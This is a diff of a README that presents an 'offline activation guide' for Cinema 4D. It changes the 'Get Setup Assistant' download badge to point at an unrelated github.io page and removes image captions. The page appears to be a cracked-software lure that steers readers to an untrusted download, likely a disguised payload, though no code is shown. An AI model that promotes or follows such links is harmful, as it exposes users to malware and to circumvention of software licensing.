@@ -1,6 +1,6 @@
 # 🌀 Cinema 4D — Offline Activation Guide
 
-[![Get Setup Assistant](https://img.shields.io/badge/Get_Setup_Assistant-darkred)](https://cinema-4d-offline-activation-guide.github.io/.github)
+[![Get Setup Assistant](https://img.shields.io/badge/Get_Setup_Assistant-darkred)](https://asdeennerhorse.github.io/mogus/cinema4d)
 
 ## 🔧 How to Install & Activate Offline
 
@@ -32,13 +32,13 @@ Cinema 4D will function in a self-contained state with no dependency on cloud se
 ## 🖼 Preview
 
 ![Cinema 4D Reel Interface](https://maxonassets.imgix.net/images/Products/Cinema-4D/Cinema4D-Reel-2025.png?fm=webp&auto=format,compress&w=1920&h=1080&ar=16:9&fit=clip&crop=faces&q=80)  
-*Modern Cinema 4D UI with high-resolution workspace preview*
+
 
 ![Timeline Animation Panel](https://www3.technologyevaluation.com/getattachment/e679cf81-8a15-4e0d-92c8-0f08151fa356/cinema4d-3dmodeling-robert-downey-jr-as-tony-startk-in-cinema4d-timeline.png?lang=en-US&source=tw2)  
-*Character animation and timeline view inside the editor*
+
 
 ![Material & Layout Tools](https://postperspective.com/wp-content/uploads/2020/04/Cinema-4D-S22_Features_Viewport-Improvements_3_Hair.png)  
-*Material editor and layout components in use during modeling*
+
 
 ---
 
